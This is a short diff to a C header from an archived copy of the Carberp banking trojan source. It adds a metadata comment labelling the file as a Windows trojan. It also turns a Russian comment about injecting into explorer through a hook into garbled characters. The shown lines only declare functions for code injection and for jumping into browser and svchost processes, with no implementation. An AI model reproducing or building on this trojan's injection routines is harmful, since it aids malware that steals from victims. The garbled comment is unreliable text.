@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 DWORD GetImageBase();
@@ -23,5 +34,5 @@ bool MegaJump( DWORD (WINAPI f_Main)(LPVOID) );
 bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) );
 bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) );
 
-//внедрение в explorer через hook, работает только в dll версии
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ explorer пїЅпїЅпїЅпїЅпїЅ hook, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ dll пїЅпїЅпїЅпїЅпїЅпїЅ
 bool InjectIntoExplorerThroughHook(const char* func);
